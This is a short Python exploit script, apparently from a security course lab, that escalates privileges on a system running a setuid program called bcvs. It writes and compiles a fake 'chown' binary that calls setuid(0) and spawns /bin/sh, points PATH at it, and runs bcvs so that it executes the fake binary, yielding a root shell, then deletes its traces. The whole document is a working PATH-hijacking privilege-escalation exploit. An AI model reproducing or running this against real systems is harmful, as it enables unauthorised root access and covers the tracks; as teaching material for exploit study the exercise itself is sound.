# Exploit 1

import os
import subprocess

# Create a fake chmod binary that sets us as root and runs /bin/sh
f = open("fake.c", "w")
f.write("""#include <stdio.h>
#include <unistd.h>
#include <dirent.h>
#include <stdlib.h>

int main() {
	setuid(0);
	setgid(0);
	setenv("PATH", "/usr/bin", 1);
	return execl ("/bin/sh", "sh", NULL);
}""")
f.close()

# Create a fakebin directory to store our new binary
os.makedirs("/home/student/fakebin", exist_ok=True)

# Compile the binary into the directory
subprocess.run('gcc fake.c -o /home/student/fakebin/chown', shell=True)

# Set the PATH variable so execlp() in bcvs uses our custom PATH to fakebin
os.environ["PATH"] = "/home/student/fakebin"

# Now call bcvs
subprocess.run('/opt/bcvs/bcvs co test.txt', shell=True)

# Clean up
os.environ["PATH"] = "/usr/bin"
subprocess.run('rm -rf {"/home/student/fakebin","fake.c","test.txt"}', shell=True)
